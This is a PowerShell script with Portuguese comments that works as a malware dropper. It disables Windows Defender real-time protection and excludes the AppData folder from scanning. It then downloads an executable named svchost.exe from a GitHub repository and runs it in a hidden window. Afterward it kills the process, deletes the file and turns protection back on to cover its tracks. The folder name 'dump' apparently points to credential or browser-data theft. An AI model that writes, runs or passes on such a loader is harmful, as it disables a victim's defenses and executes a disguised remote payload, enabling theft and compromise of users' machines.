# Verificar privilégios de administrador
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Error "Este script requer privilégios administrativos. Execute-o como administrador."
    exit 1
}

# Configurar log
$logFile = "$env:TEMP\script_log.txt"
function Write-Log ($message) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $message" | Out-File -FilePath $logFile -Append
}

Write-Log "Script iniciado."

# Desativar monitoramento em tempo real do Windows Defender
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
    Write-Log "Monitoramento em tempo real desativado."
} catch {
    Write-Log "Erro ao desativar monitoramento: $_"
    exit 1
}

# Adicionar exclusão de caminho
try {
    Add-MpPreference -ExclusionPath "$env:APPDATA" -ErrorAction Stop
    Write-Log "Caminho $env:APPDATA adicionado às exclusões."
} catch {
    Write-Log "Erro ao adicionar exclusão: $_"
    exit 1
}

# Criar diretório de trabalho
$workDir = "$env:APPDATA\dump"
try {
    if (-not (Test-Path $workDir)) {
        New-Item -Path $workDir -ItemType Directory -ErrorAction Stop | Out-Null
        Write-Log "Diretório $workDir criado."
    } else {
        Write-Log "Diretório $workDir já existe."
    }
    Set-Location $workDir
} catch {
    Write-Log "Erro ao criar diretório: $_"
    exit 1
}

# Baixar arquivo com validação
$fileUrl = "https://github.com/user337666/brow666/raw/refs/heads/main/svchost.exe"
$filePath = "$workDir\svchost.exe"
if (Test-Path $filePath) {
    Write-Log "Arquivo $filePath já existe, pulando download."
} else {
    try {
        Invoke-WebRequest -Uri $fileUrl -OutFile $filePath -ErrorAction Stop
        Write-Log "Arquivo baixado em $filePath."
    } catch {
        Write-Log "Erro ao baixar arquivo: $_"
        exit 1
    }
}

# Executar arquivo com verificação
try {
    if (Test-Path $filePath) {
        Start-Process -FilePath $filePath -WindowStyle Hidden -ErrorAction Stop -PassThru | Out-Null
        Write-Log "Arquivo $filePath executado."
    } else {
        Write-Log "Arquivo $filePath não encontrado."
        exit 1
    }
} catch {
    Write-Log "Erro ao executar arquivo: $_"
    exit 1
}

# Aguardar e encerrar processo
Start-Sleep -Seconds 6
try {
    $processName = [System.IO.Path]::GetFileNameWithoutExtension($filePath)
    Stop-Process -Name $processName -Force -ErrorAction SilentlyContinue
    Write-Log "Processo $processName encerrado."
} catch {
    Write-Log "Erro ao encerrar processo: $_"
}

# Remover arquivo
try {
    if (Test-Path $filePath) {
        Remove-Item -Path $filePath -Force -ErrorAction Stop
        Write-Log "Arquivo $filePath removido."
    }
} catch {
    Write-Log "Erro ao remover arquivo: $_"
}

# Restaurar monitoramento
try {
    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction Stop
    Write-Log "Monitoramento restaurado."
} catch {
    Write-Log "Erro ao restaurar monitoramento: $_"
}

Write-Log "Script finalizado."
